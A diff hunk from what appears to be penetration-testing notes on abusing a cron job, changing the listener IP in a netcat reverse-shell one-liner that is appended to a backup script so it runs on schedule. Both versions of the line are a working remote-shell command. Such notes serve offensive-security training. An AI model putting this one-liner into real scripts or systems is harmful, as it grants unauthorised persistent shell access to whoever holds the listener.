@@ -239,7 +239,7 @@ One way to abuse a cronjob is to insert a reverse one-liner:
 
 ```bash
 echo >> user_backups.sh
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.238 1234 >/tmp/f" >> user_eaiuebackups.sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.178 1234 >/tmp/f" >> user_eaiuebackups.sh
 ```
 
 ```bash
